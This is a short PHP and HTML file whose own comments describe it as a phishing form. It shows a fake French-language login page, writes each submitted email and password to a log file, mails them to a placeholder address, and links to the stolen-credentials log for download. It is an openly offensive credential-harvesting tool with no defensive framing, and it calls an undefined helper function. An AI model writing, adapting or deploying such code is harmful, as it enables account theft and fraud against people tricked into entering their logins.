<?php
// Configuration du formulaire de phishing
$target_email = "mail_adresse@example.com"; // Adresse email cible
$subject = "Information d'identification"; // Sujet du email
$log_file = "connections.log"; // Fichier de journalisation

// Vérification de l'adresse email et du mot de passe
if($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = test_input($_POST["email"]);
    $password = test_input($_POST["password"]);

    // Validation de l'adresse email
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        die("L'adresse email n'est pas valide");
    }

    // Enregistrement des informations d'identification dans le fichier de journalisation
    $log_entry = "Email: $email\nPassword: $password\n------------------------\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND);

    // Envoi des informations d'identification par email
    mail($target_email, $subject, "Email: $email\nPassword: $password");
    echo "Les informations d'identification ont été envoyées avec succès";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Se connecter</title>
</head>
<body>
    <h2>Se connecter</h2>
    <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
        <label for="email">Email:</label>
        <input type="text" id="email" name="email"><br>

        <label for="password">Mot de passe:</label>
        <input type="password" id="password" name="password"><br>

        <input type="submit" value="Se connecter">
    </form>

    <a href="connections.log" download>Télécharger les informations de connexion</a>
</body>
</html>
